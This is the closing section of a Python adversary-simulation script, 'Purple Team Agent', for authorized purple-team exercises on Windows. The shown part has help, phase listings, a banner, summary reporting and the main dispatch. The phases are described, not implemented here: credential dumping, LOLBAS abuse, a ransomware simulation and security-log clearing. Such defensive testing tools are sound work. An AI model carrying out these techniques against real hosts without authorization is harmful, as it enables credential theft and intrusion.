<h2>📋 Event Log</h2>
<div style="overflow-x:auto">
<table>
<thead><tr><th>Timestamp</th><th>Status</th><th>Technique</th><th>Phase</th><th>Description</th></tr></thead>
<tbody>{events_html}</tbody>
</table>
</div>
</div>

<footer>
<p>Generated by Purple Team Agent v{html.escape(SCRIPT_VERSION)}</p>
<p>FOR AUTHORIZED SECURITY TESTING ONLY</p>
</footer>
</div>
</body>
</html>"""

    with open(log.html, "w", encoding="utf-8") as f:
        f.write(html_content)
    _ok(f"HTML report generated: {log.html}")
    try:
        webbrowser.open(f"file://{log.html}")
    except Exception:
        pass


# ───────────────────────────────────────────────────────────────────────────
# HELP / BANNER / SUMMARY / MAIN
# ───────────────────────────────────────────────────────────────────────────

def show_help() -> None:
    _banner("""PURPLE TEAM AGENT v5.0
Advanced Adversary Simulation — Financial / Gov Sector
Pure Windows Python Edition — LOLBAS Techniques""")
    print()
    print(f"{C.W}USAGE:{C.RS}")
    print(f"  python agent.py [OPTIONS]")
    print()
    print(f"{C.W}OPTIONS:{C.RS}")
    print(f"  {C.G}-h, --help{C.RS}      Show this help")
    print(f"  {C.G}-a, --all{C.RS}       Run all phases (default)")
    print(f"  {C.G}-p, --phase{C.RS}     Run specific phase(s) (1-12)")
    print(f"  {C.G}-l, --list{C.RS}      List available phases")
    print(f"  {C.G}-q, --quiet{C.RS}     Minimal terminal output")
    print(f"  {C.G}--report{C.RS}        Generate HTML report after execution")
    print(f"  {C.Y}--decrypt{C.RS}      Decrypt Phase 11 simulation")
    print(f"  {C.Y}--cleanup{C.RS}      Remove all simulation artifacts")
    print()
    print(f"{C.W}PHASES:{C.RS}")
    phases = [
        ("1", "System & Environment Profiling", "T1082, T1497, T1614"),
        ("2", "Account & Privilege Discovery", "T1087, T1069, T1201"),
        ("3", "Process & Service Intelligence", "T1057, T1007, T1518"),
        ("4", "Sensitive File Discovery", "T1083, T1005, T1552"),
        ("5", "Credential Access Reconnaissance", "T1555, T1003, T1552"),
        ("6", "Defense Evasion Reconnaissance", "T1562, T1218, T1027"),
        ("7", "Network & Lateral Movement Recon", "T1049, T1018, T1482"),
        ("8", "Collection & Staging", "T1119, T1074, T1114"),
        ("9", "Persistence Mechanism Recon", "T1547, T1053, T1546"),
        ("10", "LOLBAS Abuse Demonstration", "T1218, T1105, T1027, T1564"),
        ("11", "Ransomware Simulation (Reversible)", "T1486, T1490, T1489"),
        ("12", "Blue Team Detection Validation", "T1003.001, T1059.001, T1053.005, T1071"),
    ]
    for num, title, techs in phases:
        color = C.M if num == "11" else C.CYN if num == "12" else C.G
        print(f"  {C.W}[{num:>2}]{C.RS} {color}{title}{C.RS}")
        print(f"       MITRE ATT&CK: {techs}")
    print()
    print(f"{C.W}OUTPUT:{C.RS}")
    print(f"  Terminal: Colour-coded with findings severity")
    print(f"  Text Log: %TEMP%\\purpleteam_*.log")
    print(f"  JSON Log: %TEMP%\\purpleteam_*.json")
    print(f"  HTML Report: %TEMP%\\purpleteam_*.html")
    print()
    print(f"{C.Y} FOR AUTHORIZED PURPLE TEAM EXERCISES ONLY{C.RS}")
    print()


def list_phases() -> None:
    _banner("AVAILABLE PHASES")
    detail = [
        ("1", "System & Environment Profiling", "T1082, T1497.001, T1614, T1614.001",
         "Fingerprint OS, hardware, VM detection, security stack, locale", "~20s"),
        ("2", "Account & Privilege Discovery", "T1087, T1069, T1201, T1033",
         "Local/domain users, groups, password policy, admin enum", "~25s"),
        ("3", "Process & Service Intelligence", "T1057, T1007, T1518.001, T1497.001",
         "Running processes, security tools, financial apps, analysis tools", "~20s"),
        ("4", "Sensitive File Discovery", "T1083, T1005, T1552.001, T1552.004",
         "Documents, certs, keys, configs, password DBs, RDP files", "~30s"),
        ("5", "Credential Access Reconnaissance", "T1552, T1555, T1003, T1552.006",
         "Browser creds, Credential Manager, LSASS, SAM, cloud tokens", "~35s"),
        ("6", "Defense Evasion Reconnaissance", "T1562, T1218, T1027",
         "PS logging, Sysmon, firewall, AppLocker, AMSI, audit policy", "~25s"),
        ("7", "Network & Lateral Movement Recon", "T1049, T1018, T1135, T1482, T1016",
         "Connections, shares, routing, domain trusts, RDP history", "~30s"),
        ("8", "Collection & Staging", "T1119, T1074.001, T1114.001, T1005",
         "Stage documents, email archives, clipboard, recent files", "~25s"),
        ("9", "Persistence Mechanism Recon", "T1547, T1053, T1543, T1546, T1574",
         "Run keys, tasks, services, WMI, COM hijack, DLL search order", "~25s"),
        ("10", "LOLBAS Abuse Demonstration", "T1218, T1105, T1027, T1564.004",
         "Demonstrate certutil, bitsadmin, forfiles, esentutl, rundll32, mshta abuse", "~30s"),
        ("11", "Ransomware Simulation (Reversible)", "T1486, T1490, T1489, T1529",
         "Create/encrypt fake corporate files, drop ransom notes, --decrypt to reverse", "~35s"),
        ("12", "Blue Team Detection Validation", "T1003.001, T1071, T1059.001, T1547.001, T1053.005, T1070.001, T1071.004, T1134",
         "LSASS handle, CS named pipe, encoded PS, fake persistence, log clear, DGA DNS — real SOC alerts", "~40s"),
    ]
    for num, title, techs, desc, dur in detail:
        color = C.M if num == "11" else C.CYN if num == "12" else C.G
        print(f"  {C.W}[{num:>2}]{C.RS} {color}{title}{C.RS}")
        print(f"       MITRE ATT&CK: {techs}")
        print(f"       {desc}")
        print(f"       Duration: {dur}")
        print()
    print(f"  {C.D}Total estimated time: ~7-8 minutes{C.RS}")
    print()


def show_banner() -> None:
    os.system("cls" if sys.platform == "win32" else "clear")
    banner = r"""
 ╔═══════════════════════════════════════════════════════════════════╗
 ║                                                                   ║
 ║  ██████╗ ██╗   ██╗██████╗ ██████╗ ██╗     ███████╗              ║
 ║  ██╔══██╗██║   ██║██╔══██╗██╔══██╗██║     ██╔════╝              ║
 ║  ██████╔╝██║   ██║██████╔╝██████╔╝██║     █████╗                ║
 ║  ██╔═══╝ ██║   ██║██╔══██╗██╔═══╝ ██║     ██╔══╝                ║
 ║  ██║     ╚██████╔╝██║  ██║██║     ███████╗███████╗              ║
 ║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝              ║
 ║                                                                   ║
 ║  ████████╗███████╗ █████╗ ███╗   ███╗                           ║
 ║  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                           ║
 ║     ██║   █████╗  ███████║██╔████╔██║                           ║
 ║     ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                           ║
 ║     ██║   ███████╗██║  ██║██║ ╚═╝ ██║                           ║
 ║     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                           ║
 ║                                                                   ║
 ║  Advanced Adversary Simulation Framework  v5.0                  ║
 ║  Pure Windows — LOLBAS Techniques                               ║
 ║  Financial / Government Sector TTPs                               ║
 ║                                                                   ║
 ╚═══════════════════════════════════════════════════════════════════╝
"""
    print(f"{C.CYN}{banner}{C.RS}")
    print(f"  {C.W}Version:{C.RS}  {C.CYN}{SCRIPT_VERSION}{C.RS}")
    print(f"  {C.W}Target:{C.RS}   {C.CYN}Windows Host (Native){C.RS}")
    print(f"  {C.W}Engine:{C.RS}   {C.CYN}LOLBAS (Living Off The Land){C.RS}")
    print(f"  {C.W}Purpose:{C.RS}  {C.CYN}Authorized Purple Team Exercise{C.RS}")
    print()
    print(f"  {C.Y}⚠ FOR AUTHORIZED SECURITY TESTING ONLY ⚠{C.RS}")
    print()


def generate_summary(gen_report: bool = False) -> None:
    dur = int(time.time() - log.start)
    m, s = dur // 60, dur % 60

    # ── Detection metrics from phase 12 ──────────────────────────────────
    dt_executed = [r for r in log.detection_results if r.outcome == "EXECUTED"]
    dt_blocked  = [r for r in log.detection_results if r.outcome == "BLOCKED"]
    dt_total    = len(dt_executed) + len(dt_blocked)
    # Detection/block rate: TTPs the blue team's controls stopped vs. all TTPs tested
    detect_rate = (len(dt_blocked) / dt_total * 100) if dt_total > 0 else None

    # ── Findings grouped by severity ──────────────────────────────────────
    sev_order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
    sev_col   = {"CRITICAL": C.R, "HIGH": C.R, "MEDIUM": C.Y, "LOW": C.CYN, "INFO": C.D}
    sev_counts: Dict[str, int] = {}
    for f in log.findings:
        sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1

    # ── Terminal output ───────────────────────────────────────────────────
    print()
    print(f"{C.CYN}╔═══════════════════════════════════════════════════════════════════════╗{C.RS}")
    print(f"{C.CYN}║{C.RS} {C.W}EXECUTION SUMMARY{C.RS}                                     {C.CYN}║{C.RS}")
    print(f"{C.CYN}╚═══════════════════════════════════════════════════════════════════════╝{C.RS}")
    print()
    print(f"  {'Duration:':<26} {m}m {s}s")
    print(f"  {'Total Actions:':<26} {exe.total}")
    print(f"  {C.G}{'Detected / Completed:':<26}{C.RS} {exe.ok}")
    print(f"  {C.R}{'Blocked / Failed:':<26}{C.RS} {exe.fail}")
    print(f"  {C.Y}{'Skipped:':<26}{C.RS} {exe.skip}")
    print()

    # ── Security detection metrics ────────────────────────────────────────
    if dt_total > 0:
        print(f"  {C.W}── Phase 12 — Detection Effectiveness ──{C.RS}")
        ex_col = C.R if dt_executed else C.G
        bl_col = C.G if dt_blocked  else C.Y
        print(f"  {ex_col}{'TTPs Executed (not blocked):':<26}{C.RS} {len(dt_executed)}/{dt_total}"
              f"  ← {C.R}detection gaps{C.RS}")
        print(f"  {bl_col}{'TTPs Blocked by controls:':<26}{C.RS} {len(dt_blocked)}/{dt_total}"
              f"  ← {C.G}controls working{C.RS}")
        rate_col = C.G if detect_rate and detect_rate >= 75 else C.Y if detect_rate and detect_rate >= 50 else C.R
        print(f"  {rate_col}{'Detection / Block Rate:':<26}{C.RS} {detect_rate:.1f}%")
        print()
        if dt_executed:
            print(f"  {C.R}TTPs that ran undetected (blue team gaps):{C.RS}")
            for r in dt_executed:
                print(f"    {C.R}✗{C.RS} {r.test_id} {r.test_name} [{r.technique}]")
                print(f"      {C.D}{r.detail}{C.RS}")
        if dt_blocked:
            print(f"  {C.G}TTPs blocked by security controls:{C.RS}")
            for r in dt_blocked:
                print(f"    {C.G}✓{C.RS} {r.test_id} {r.test_name} [{r.technique}]")
                print(f"      {C.D}{r.detail}{C.RS}")
        print()

    # ── Findings list ─────────────────────────────────────────────────────
    print(f"  {C.W}── Findings ({len(log.findings)}) ──{C.RS}")
    if log.findings:
        for f in log.findings:
            col = sev_col.get(f.severity, C.W)
            print(f"  {col}[{f.severity}]{C.RS} {f.message}")
    else:
        print(f"  {C.D}No findings recorded.{C.RS}")
    print()

    # ── Output files ──────────────────────────────────────────────────────
    print(f"  {C.W}── Output Files ──{C.RS}")
    print(f"  Text Log:    {log.txt}")
    print(f"  JSON Log:    {log.json}")
    print(f"  HTML Report: {log.html}")
    print()

    # ── Blue team indicators ──────────────────────────────────────────────
    print(f"  {C.W}── Blue Team Indicators to Validate ──{C.RS}")
    print(f"  • Sysmon 10 (ProcessAccess on lsass.exe) — DT-001")
    print(f"  • Sysmon 17 (PipeCreated — MSSE / postex pattern) — DT-002")
    print(f"  • Security 4104 (Script Block — EncodedCommand) — DT-003")
    print(f"  • Security 4657 (Registry Run key modified) — DT-004")
    print(f"  • Security 4698/4699 (Scheduled Task created/deleted) — DT-005")
    print(f"  • wevtutil cl Security in process creation logs — DT-006")
    print(f"  • Sysmon 22 (DNS query — DGA/beacon-pattern FQDN) — DT-007")
    print(f"  • Sysmon 1 (whoami /priv /groups) — DT-008")
    print(f"  • Process Creation 4688 (LOLBAS binaries) — Phases 1-10")
    print(f"  • Registry Access 4657 — Phases 5-9")
    print()

    log.finalize(exe.total, exe.ok, exe.fail, exe.skip)

    # ── Text log: summary ─────────────────────────────────────────────────
    log.write(0, "")
    log.write(0, "══════════════════════════════════════════════════════════════════")
    log.write(0, "EXECUTION SUMMARY")
    log.write(0, "══════════════════════════════════════════════════════════════════")
    log.write(0, f"Completed: {datetime.now().strftime('%d/%m/%Y %H:%M:%S %Z')}")
    log.write(0, f"Duration: {m}m {s}s")
    log.write(0, f"Total Actions : {exe.total}")
    log.write(0, f"Detected / Completed : {exe.ok}")
    log.write(0, f"Blocked / Failed     : {exe.fail}")
    log.write(0, f"Skipped              : {exe.skip}")
    if dt_total > 0:
        log.write(0, "")
        log.write(0, "── Phase 12 Detection Effectiveness ──")
        log.write(0, f"  TTPs Executed (gaps)   : {len(dt_executed)}/{dt_total}")
        log.write(0, f"  TTPs Blocked           : {len(dt_blocked)}/{dt_total}")
        if detect_rate is not None:
            log.write(0, f"  Detection / Block Rate : {detect_rate:.1f}%")
        for r in dt_executed:
            log.write(0, f"  [GAP]     {r.test_id} {r.test_name} — {r.detail}")
        for r in dt_blocked:
            log.write(0, f"  [BLOCKED] {r.test_id} {r.test_name} — {r.detail}")
    log.write(0, "")
    log.write(0, f"── Findings ({len(log.findings)}) ──")
    for f in log.findings:
        log.write(0, f"  [{f.severity}] {f.message}")
    log.write(0, "")
    log.write(0, f"Output Files:")
    log.write(0, f"  Text:    {log.txt}")
    log.write(0, f"  JSON:    {log.json}")
    log.write(0, f"  HTML:    {log.html}")
    log.write(0, "══════════════════════════════════════════════════════════════════")
    sev_counts = sev_counts  # already populated above
    log.write(0, f"Output Files:")
    log.write(0, f"  Text:    {log.txt}")
    log.write(0, f"  JSON:    {log.json}")
    log.write(0, f"  HTML:    {log.html}")
    log.write(0, f"══════════════════════════════════════════════════════════════════")

    if gen_report:
        generate_html_report()

    print(f"{C.G}✓ Purple Team exercise completed{C.RS}")
    print()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Purple Team Agent v5.0 — Pure Windows Python Edition (LOLBAS)",
        add_help=False)
    parser.add_argument("-h", "--help", action="store_true", help="Show help")
    parser.add_argument("-a", "--all", action="store_true", help="Run all phases (default)")
    parser.add_argument("-p", "--phase", type=str, help="Run specific phase(s) (1-12, comma-separated)")
    parser.add_argument("-l", "--list", action="store_true", help="List available phases")
    parser.add_argument("-q", "--quiet", action="store_true", help="Minimal terminal output")
    parser.add_argument("--report", action="store_true", help="Generate HTML report after execution")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt Phase 11 simulation")
    parser.add_argument("--cleanup", action="store_true", help="Remove simulation artifacts")
    args = parser.parse_args()

    if args.help:
        show_help(); sys.exit(0)
    if args.list:
        list_phases(); sys.exit(0)
    if args.decrypt:
        decrypt_simulation(); sys.exit(0)
    if args.cleanup:
        cleanup_simulation(); sys.exit(0)

    _enable_ansi()
    if not args.quiet:
        show_banner()
        time.sleep(1)

    phases_map = {
        "1": phase_system, "2": phase_accounts, "3": phase_processes,
        "4": phase_files, "5": phase_creds, "6": phase_defense,
        "7": phase_network, "8": phase_collection, "9": phase_persistence,
        "10": phase_lolbas, "11": phase_impact, "12": phase_eicar,
    }

    # Phase 0 (environment) always runs first
    phase_env()
    time.sleep(0.5)

    if args.phase:
        for p in args.phase.split(","):
            p = p.strip()
            if p in phases_map:
                phases_map[p]()
                time.sleep(0.5)
            else:
                _err(f"Invalid phase: {p} (valid: 1-12)")
    else:
        for p in phases_map.values():
            p()
            time.sleep(0.5)

    generate_summary(gen_report=args.report)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        _err("Interrupted by user")
        generate_summary()
        sys.exit(1)
